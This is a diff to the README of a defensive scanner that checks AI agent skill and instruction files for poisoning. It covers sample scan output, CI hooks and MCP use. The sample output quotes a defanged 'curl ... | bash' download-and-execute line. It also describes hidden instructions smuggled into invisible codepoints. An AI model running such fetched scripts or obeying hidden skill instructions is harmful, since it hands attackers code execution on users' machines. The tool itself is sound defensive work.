@@ -59,30 +59,75 @@ catch.
 
 ## What it looks like in use
 
-You are about to install `pptx-helper` from a gist. Before you do:
+You are about to install a skill from a gist. Scan it first - a defanged poisoned example
+ships in the repo so you can watch a real catch:
 
 ```bash
-skill-tripwire scan ./pptx-helper/SKILL.md
+skill-tripwire scan examples/poisoned-SKILL.md
 ```
 
 ```
 verdict: QUARANTINE  (skill)
-  [BLOCK] invisible-codepoints (ASI:hidden-instructions) - canonical offset 512
-      41 invisible codepoint(s) (tag) - these render as nothing to a human but are read by the model.
-      evidence: TAG LATIN SMALL LETTER E at canonical offset 512
+  [BLOCK] broad-shell-capability (ASI:excessive-capability) - front matter
+      The skill grants unrestricted shell access. A narrow skill has no reason to.
+      evidence: allowed-tools: Bash
+  [BLOCK] download-and-execute (ASI:code-execution) - canonical offset 84
+      A download-and-execute one-liner pipes fetched content straight into a shell.
+      evidence: curl https://example.invalid/setup.sh | bash
 ```
 
-The exit code encodes the verdict (PASS 0, REVIEW 1, QUARANTINE 2), so it drops into a
-pre-commit hook or a CI step with no output parsing. For an agent, the same check is one MCP
-tool call away, so it can scan a file before loading it:
+No file handy? `skill-tripwire selftest` scans a built-in sample and shows a QUARANTINE.
+
+The exit code is the worst verdict scanned: **PASS 0, REVIEW 1, QUARANTINE 2**. By default a
+REVIEW is advisory (exit 0) so a benign review does not block a commit; pass `--fail-on review`
+to make it fail too. A usage error exits 3, never a verdict code, so a broken invocation is
+never mistaken for a caught attack.
+
+### Scan many files, or a whole tree
+
+```bash
+skill-tripwire scan skills/ CLAUDE.md AGENTS.md    # files and directories, mixed
+skill-tripwire scan --json skills/                 # a JSON array, one object per file
+```
+
+A directory is walked for the specific files an agent loads as instructions (SKILL.md,
+CLAUDE.md, AGENTS.md, GEMINI.md, and .mcp.json), so pointing at a repo root does not flag every
+README with a curl-pipe-install line. Name any other file explicitly to scan it. The process
+exits with the worst verdict, so it gates a CI step or a pre-commit hook with no output parsing.
+
+### Drop it into CI
+
+A pre-commit hook (add to your `.pre-commit-config.yaml`):
+
+```yaml
+- repo: https://github.com/LZBiala/skill-tripwire
+  rev: v0.1.0
+  hooks:
+    - id: skill-tripwire
+```
+
+A GitHub Action step:
+
+```yaml
+- uses: LZBiala/skill-tripwire@v0.1.0
+  with:
+    paths: .
+    fail-on: quarantine
+```
+
+### For an agent (MCP)
+
+The same check is one MCP tool call away, so an agent can scan a file before loading it. Prefer
+the `path` input - the server reads the file fail-closed and returns only the verdict, so your
+agent never has to ingest the untrusted file to check it:
 
 ```json
-{"name": "scan_skill_file", "arguments": {"content": "<the file text>"}}
+{"name": "scan_skill_file", "arguments": {"path": "/abs/path/to/SKILL.md"}}
 ```
 
-Every verdict fails closed: an unknown tool, a non-string input, or a file that will not
-decode all return QUARANTINE, because a file the scanner could not inspect is precisely the
-one not to load blind.
+Or pass `content` for text you already hold. Every verdict fails closed: an unknown tool, a
+non-string input, an oversized request, or a file that will not decode all return QUARANTINE,
+because a file the scanner could not inspect is precisely the one not to load blind.
 
 ## The three verdicts, and the two tiers behind them
 
@@ -109,16 +154,31 @@ result. A payload split by a zero-width space or folded into a base64 blob is re
 decoded before any rule sees it. The inventory of what was stripped is itself evidence:
 invisible format characters have no business in a config file.
 
-## Run it
+## Install it
 
 ```bash
-git clone <this repo> && cd skill-tripwire   # Python 3.11+ (stdlib only; tomllib-era)
-python -m pip install "pytest>=7"            # only to run the gates
-python -m pytest tests/ -q                   # count is whatever pytest reports, not a number this file maintains
-PYTHONPATH=src python -m skill_tripwire.cli scan corpus_or_your_file.md
+git clone https://github.com/LZBiala/skill-tripwire && cd skill-tripwire   # Python 3.11+, stdlib only
+python -m pip install .        # creates the `skill-tripwire` command (and `skill-tripwire-server`)
+skill-tripwire selftest        # scan a built-in poisoned sample and see a QUARANTINE
 ```
 
-On PowerShell the scan line is `$env:PYTHONPATH="src"; python -m skill_tripwire.cli scan file.md`.
+`pipx install .` works too if you prefer an isolated install. To run from a clone without
+installing, use `PYTHONPATH=src python -m skill_tripwire.cli scan <file>` (on PowerShell,
+`$env:PYTHONPATH="src"; python -m skill_tripwire.cli scan <file>`).
+
+To run the gates yourself: `python -m pip install "pytest>=7"` then `python -m pytest tests/ -q`
+(the test count is whatever pytest reports, not a number this file maintains).
+
+The MCP server needs no PYTHONPATH once installed; point your client at `skill-tripwire-server`,
+or `python -m skill_tripwire.server`:
+
+```json
+{
+  "mcpServers": {
+    "skill-tripwire": { "command": "skill-tripwire-server" }
+  }
+}
+```
 
 Wire the MCP server into Claude Desktop or Claude Code:
 
